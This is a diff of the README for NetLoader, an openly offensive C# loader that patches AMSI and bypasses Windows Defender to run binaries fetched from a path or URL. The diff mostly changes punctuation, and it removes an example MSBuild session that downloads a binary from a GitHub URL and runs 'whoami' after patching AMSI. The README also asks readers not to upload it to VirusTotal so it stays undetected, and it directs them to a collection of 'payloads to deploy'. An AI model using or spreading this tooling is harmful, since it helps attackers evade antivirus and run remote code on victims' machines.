@@ -2,10 +2,10 @@
 Loads any C# binary from filepath or url, patching AMSI and bypassing Windows Defender on runtime
 
 Latest update / signature fix was 09.06.2020, clean as a whistle
-I am doing 24/7 signature checks and pushing updates when possible so I can keep NetLoader undetected (mainly for my own educational purposes)
+I am doing 24/7 signature checks and pushing updates when possible so I can keep NetLoader undetected (mainly for my own educational purposes).
 **Please do not upload to VirusTotal and DISABLE "Sample Submission" when testing / possible**
 
-**Looking for binaries/payloads to deploy? Checkout [SharpCollection](https://github.com/Flangvik/SharpCollection)**! SharpCollection contains nightly builds of C# offensive tools, fresh from their respective master branches built and released in a CDI fashion using Azure DevOps release pipelines.
+**Looking for binaries/payloads to deploy? Checkout [SharpCollection](https://github.com/Flangvik/SharpCollection)**!. SharpCollection contains nightly builds of C# offensive tools, fresh from their respective master branches built and released in a CDI fashion using Azure DevOps release pipelines.
 
 # Compile
 
@@ -21,24 +21,6 @@ NetLoader has to be used in interactive mode when deployed using MSBuild
 
 	For 32 bit:
 	C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe NetLoader.xml
-	
-	Example:
-	C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe NetLoader.xml
-	Microsoft (R) Build Engine version 4.7.3190.0
-	[Microsoft .NET Framework, version 4.0.30319.42000]
-	Copyright (C) Microsoft Corporation. All rights reserved.
-
-	Build started 6/9/2020 10:54:26 PM.
-	[!] ~Flangvik  #NetLoader
-	[?] Input X in 'path or url' to exit!
-	[?] Input path or url ->
-	https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin
-	[?] Input args (optional) ->
-	whoami
-	[+] Successfully patched AMSI!
-	[+] URL/PATH : https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin
-	[+] Arguments : whoami
-	windef\tigerking
 
 # Usage
 Deploy payload from remote URI with args, non-interactive mode
